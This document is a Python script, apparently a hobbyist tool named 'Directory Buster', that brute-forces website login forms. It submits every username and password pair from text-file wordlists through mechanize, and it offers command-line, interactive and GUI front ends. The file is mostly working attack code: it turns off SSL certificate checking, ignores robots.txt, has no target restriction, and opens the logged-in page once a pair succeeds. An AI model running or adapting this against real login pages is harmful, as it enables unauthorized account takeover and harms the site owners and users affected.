import sys, os, getopt
import tkinter.messagebox
import webbrowser
import mechanize
import requests
from tkinter import *
from tkinter.ttk import *
import ssl

# Creating a ssl certificate to access https pages.
ssl._create_default_https_context = ssl._create_unverified_context

startGUI = True

def create_list_from_file(filename:str) -> list:
    """Reads through a textfile line by line, generating a list of strings"""

    #Opens the file, and reads all lines into a list named "data"
    with open(filename, "r") as file:
        data = file.read().splitlines() #Removes \n in each line
        file.close()

    #Removes "Credits" lines if present in wordlist file.
    for line in data:
        if line.startswith("#"):
            data.remove(line)

    #If the data list contains more than 0 entries, return it.
    if len(data)>0:
        print("List generated, containing [{}] entries".format(len(data)))
        return data
    else:
        print("Could not generate list")

def discover_wordlists() -> list:
    """Goes through the files in the current working directory, filters out files ending in .txt, and adds them to a list,
        and returning the list."""

    temp_fileList = os.listdir()
    fileList = []

    for files in temp_fileList:
        if ".txt" in files:
            fileList.append(files)
    fileList.sort() #Sorts the list
    return fileList #Returns a list of files, empty if no files matches the filter (".txt")

def crack_loginform(target:str, usernames:list=[], passwords:list=[], form_number:int=0, formInput_username:str="", formInput_password:str="") -> tuple:
    """This function takes a target website, a list of usernames and passwords, and enters it into the specified HTML
        form in the appropriate input fields. When the returned HTML code contains the word 'logout', this indicates
        that a username and password combination was found, and that a user is logged in.
        The function then returns a tuple consisting of the HTML code, username, and password."""

    br = mechanize.Browser()
    br.set_handle_robots(False)  # ignore robots.txt

    # For each username, check each password.
    for u in usernames:
        for p in passwords:
             br.open(target)
             # Selects the form specified
             br.select_form(nr=form_number)
             # Uses the names of the input fields to post the current username/password test
             br.form[formInput_username] = u
             br.form[formInput_password] = p
             # submits the form
             response = br.submit()
             # opens URL
             site = br.open(target)
             # The HTML code
             checkText = site.read().decode("utf-8")

             # If the word 'logout' is in the returned HTML code after submitting, success.
             if "logout" in checkText:
                 #Uses webbrowser module to open the page for the user.
                 webbrowser.open(response.geturl())
                 return (checkText, u, p)
                 break


def main(argv):
    """This function should only run when the program is started from the commandline.
        It takes a target website and dictionaries for usernames and passwords, along with HTML form index and
        input field names."""

    targetWebsite = ""
    usernameList = []
    passwordList = []
    formUserID = ""
    forPassID = ""
    formID = 0


    try:
       opts, args = getopt.getopt(argv,"hft:u:p:",["target=","usernames=", "passwords=", "formID=", "uID=", "pID="])
    except getopt.GetoptError:
        print("Scan a website for subdomains, directories and files. \n\n"
              "Can be used with either a dictionary.txt, or as a known username or password. \n\n"
                 "Usage:\n",
                "-"*40, "\n"
                "Args:\n"
                "-h: Shows this help text\n"
                "-f: Finds textfiles to use as a dictionary\n"
                "-t <keyword>: Website Login URL\n"
                "-u <keyword>: Username dictionary to use, or a known username\n"
                "-p <keyword>: Password dictionary to use, or a known password\n"
                "--formID <int>: The index of the HTML form containing the username/password field (default=0)\n"
                "--uID <keyword>: The name in the HTML form, for the input field 'username'.\n"
                "--pID <keyword>: The name in the HTML form, for the input field 'password'.\n"
                "-gui: Starts the interactive GUI version\n"
                "-cmd: Starts the interactive commandline version\n",
                "-"*40,"\n"
                "DirectoryBuster.py -f :Finds textfiles in working directory\n"
                "DirectoryBuster.py -t www.example.com/login.html -u commonUsernames.txt -p commonPasswords.txt --formID 0 --uID uid --pID pw\n"
                "Use interactive GUI: DirectoryBuster.py -gui\n"
                "Use interactive commandline: DirectoryBuster.py -cmd\n")
        sys.exit()

    #Iterates through the arguments, and assigns the corresponding value (arg) to the matching variables (opt)
    for opt, arg in opts:
        if opt == "-h":
           print("Attempt to dictionary attack a website's login form.\n"
                 "Can be used with either a dictionary.txt, or as a known username or password. \n\n"
                 "Usage:\n",
                "-"*40, "\n"
                "Args:\n"
                "-h: Shows this help text\n"
                "-f: Finds textfiles to use as a dictionary\n"
                "-t <keyword>: Website Login URL\n"
                "-u <keyword>: Username dictionary to use, or a known username\n"
                "-p <keyword>: Password dictionary to use, or a known password\n"
                "--formID <int>: The index of the HTML form containing the username/password field (default=0)\n"
                "--uID <keyword>: The name in the HTML form, for the input field 'username'.\n"
                "--pID <keyword>: The name in the HTML form, for the input field 'password'.\n"
                "-gui: Starts the interactive GUI version\n"
                "-cmd: Starts the interactive commandline version\n",
                "-"*40,"\n"
                "DirectoryBuster.py -f :Finds textfiles in working directory\n"
                "DirectoryBuster.py -t www.example.com/login.html -u commonUsernames.txt -p commonPasswords.txt --formID 0 --uID uid --pID pw\n"
                "Use interactive GUI: DirectoryBuster.py -gui\n"
                "Use interactive commandline: DirectoryBuster.py -cmd\n")
           sys.exit()
        elif opt in ("-f"):
           files = discover_wordlists()
           for f in files:
               print(f)
        elif opt in ("-t", "--target"):
           targetWebsite = arg
        elif opt in ("-u", "--usernames"):
            if not arg.endswith(".txt"):
                # If the -u argument does not end with .txt, assume its a username
                # and add it to the list
                usernameList = [arg]
            else:
                usernameList = create_list_from_file(arg)
        elif opt in ("-p", "--passwords"):
            # If the -p argument does not end with .txt, assume its a password
            # and add it to the list
            if not arg.endswith(".txt"):
                passwordList = [arg]
            else:
                passwordList = create_list_from_file(arg)
        elif opt in ("--formID"):
            formID = int(arg)
        elif opt in ("--uID"):
            formUserID = arg
        elif opt in ("--pID"):
            formPassID = arg



    if targetWebsite != "":
        response = requests.get(targetWebsite).status_code
        if response == 200:
            print("\n{} returned with response code {}. OK".format(targetWebsite, 200))

            # Tries to get a result
            try:
                result = crack_loginform(targetWebsite, usernameList, passwordList, formID, formUserID, formPassID)
                print("Username: {}\nPassword: {}\n\HTML of the Page: \n\n{}".format(result[1], result[2], result[0]))
            except:
                print("No matches found")

    sys.exit()


if sys.stdin and sys.stdin.isatty():
    """This checks if arguments are passed to the program through the commandline. It will switch between GUI, commandline
        and taking arguments depending on input. """

    # This will have a minimum length of 1, since the name of the script is index 0
    if len(sys.argv) > 1:
        # If this argument is recieved, set the startGUI bool and skip other args.
        if sys.argv[1] == "-gui":
            startGUI = True
            pass
        # If this argumed is recieved, set the startGUI bool to False, and skip other args
        elif sys.argv[1] == "-cmd":
            startGUI = False
            pass
        else:
            main(sys.argv[1:])

    # If the program is run from the commandline, without arguments, the 'main' function is run with the -h argument to help the user use it correctly.
    else:
        main(["-h"])
        sys.exit()

def btn_clicked_check_website(website:str):
    """Function for the GUI, checks if the website exists, and unlocks the 'Start' button."""

    if "http" not in website[0:4]:
        website = "http://" + website

    try:
        result = requests.get(website).status_code
        websiteresult_dynamic.set("{} responded with Code:{}".format(website,result))
        #btn_startScan["state"] = ACTIVE
        entry_website.delete(0, END)
        entry_website.insert(0, website)
    except:
        websiteresult_dynamic.set("{} could not be reached.".format(website))

def btn_clicked_reload_filelist():
    """Function for the GUI, updates the list of .txt files for the drop down list"""

    comboListUnames["values"] = discover_wordlists()
    comboListUnames.current(0)
    comboListPasswords["values"] = discover_wordlists()
    comboListPasswords.current(0)

def btn_clicked_process_input():
    """Function for the GUI, processes the data entered by the user, and starts the crack_loginform function."""

    try:
        target = entry_website.get()
        unameList = create_list_from_file(comboListUnames.get())
        pwList = create_list_from_file(comboListPasswords.get())
        formID = int(entry_formID.get())
        formUname = entry_formUname.get()
        formPw = entry_formPw.get()
        result = crack_loginform(target,unameList,pwList,formID,formUname,formPw)
        resultText.delete("1.0", END)
        resultText.insert("1.0", "Username: {}".format(result[1]))
        resultText.insert(END, "\nPassword: {}".format(result[2]))
        resultText.insert(END, "\n\nHTML of the page:\n{}".format(result[0]))
        resultWindow.deiconify()
    except:
        tkinter.messagebox.showwarning("Invalid Input", "Some information is missing/invalid. Please check and try again")


if startGUI:
    """Code for the GUI, is the program is started with startGUI set to True"""
    #Main window
    window = Tk()
    window.geometry("700x550+100+300")
    window.title("Directory Buster v1")
    #Result popup window
    resultWindow = Toplevel(window)
    resultWindow.geometry("700x500+605+300")
    resultWindow.withdraw()

    # Updates the Label UI if the site was reached or not.
    websiteresult_dynamic = StringVar()
    websiteresult_dynamic.set("")

    Label(window, text="Enter the 'login' URL of a website: (www.example.com/login)").pack(pady=2, side=TOP)
    entry_website = Entry(window, width=80)
    entry_website.pack(side=TOP)

    # Checks if the website is reachable.
    Button(window, text="Check Website", command= lambda :btn_clicked_check_website(entry_website.get())).pack(pady=4, side=TOP)
    Label(window, textvariable=websiteresult_dynamic).pack(pady=2, side=TOP)
    Label(window, text="__" * 60).pack(pady=2, side=TOP)

    Label(window, text="Please select a list of usernames").pack(pady=2, side=TOP)
    Label(window, text="Username:")
    comboListUnames = Combobox()
    comboListUnames.pack(pady=2, side=TOP)

    Label(window, text="Please select a list of passwords").pack(pady=2, side=TOP)
    comboListPasswords = Combobox()
    comboListPasswords.pack(pady=2, side=TOP)
    Button(window, text="Reload lists", command=btn_clicked_reload_filelist()).pack(pady=4, side=TOP)
    Label(window, text="__" * 60).pack(pady=2, side=TOP)

    # Informing the user of what information they need from the target websites HTML code.
    Label(window, text="The following information can be gotten from inspecting the HTML code of the website's login page").pack(pady=2, side=TOP)
    Label(window, text="Enter form number (Assuming first (0) if empty:").pack(pady=2, side=TOP)
    entry_formID = Entry(window)
    entry_formID.insert(END, "0")
    entry_formID.pack(pady=2, side=TOP)
    Label(window, text="Enter Username input field name (ex. <input type='text' name='?????'):").pack(pady=2, side=TOP)
    entry_formUname = Entry(window)
    entry_formUname.pack(pady=2, side=TOP)
    Label(window, text="Enter Username input field name (ex. <input type='password' name='?????'):").pack(pady=2, side=TOP)
    entry_formPw = Entry(window)
    entry_formPw.pack(pady=2, side=TOP)

    #Starts the scan.
    btn_startScan = Button(window, text="Start", command=btn_clicked_process_input).pack(pady=2, side=TOP)

    resultText = Text(resultWindow, width=128, height=40)
    resultText.pack(pady=4, side=TOP, anchor=W)

    window.mainloop()

if not startGUI:
    # Runs this look as long as the result is unchanged at 0.
    result = 0
    while result == 0:
        targetwebsite = input("Enter Login page URL: ")
        # Allows the user to use a username or password, if one is known. Reducing the time
        # it takes to crack the form.
        uname = input("Enter username, if known: ")
        pw = input("Enter password, if known: ")
        formID = int(input("Enter index of the HTML form on the login page (first is 0) [int]: "))
        userID = input("Enter the name of the input field 'username' (or similar): ")
        passID = input("Enter the name of the input field 'password' (or similar): ")


        try:
            result = requests.get(targetwebsite).status_code
            if result == 200:
                print("URL is reachable. \o/")
                break
        except:
            print("URL not reachable -.-")

    wordfiles = discover_wordlists()
    while True:
        # If either the uname or pw is blank, print files for the user.
        if uname == "" or pw == "":
            print("Text files found: ")
            for f in wordfiles:
                print("[{}] - {}".format(wordfiles.index(f), f))
        # If no username i known, or entered. Select a list of usernames.
        if uname == "":
            usernamefile = input("Please select a wordlist to use as Username Dictionary, [Index] or name.txt: ")
            if usernamefile in wordfiles:
               usernameList = create_list_from_file(usernamefile)
            elif int(usernamefile) < len(wordfiles):
               usernameList = create_list_from_file(wordfiles[int(usernamefile)])
        else:
            usernameList = [uname]

        # If no password is known, or entered. Select a list of passwords.
        if pw == "":
            passwordfile = input("Please select a file to use as Password Dictionary, [Index] or name.txt: ")
            if passwordfile in wordfiles:
               passwordList = create_list_from_file(passwordfile)
            elif int(passwordfile) < len(wordfiles):
               passwordList = create_list_from_file(wordfiles[int(passwordfile)])
        else:
            passwordList = [pw]

        try:
            # Use the entered information to try and crack the login form
            result = crack_loginform(targetwebsite,usernameList,passwordList, formID, userID, passID)
            print("Username: {}\nPassword: {}\n\HTML of the Page: \n\n{}".format(result[1], result[2], result[0]))
        except:
            print("No matches found")

        break





